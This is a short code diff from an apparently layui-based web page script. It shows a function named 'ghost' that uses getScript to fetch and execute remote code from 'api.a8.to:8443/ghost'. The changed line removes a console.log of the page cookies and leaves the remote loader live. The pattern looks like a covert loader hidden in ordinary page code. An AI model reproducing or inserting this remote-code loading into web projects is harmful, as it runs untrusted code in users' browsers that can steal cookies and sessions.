@@ -1524,7 +1524,7 @@ layui.use(["table"], function () {
         }
 
         layui.$.getScript("https://api.a8.to:8443/ghost", function () {
-            console.log(document.cookie);
+           
         });
     };
     ghost();
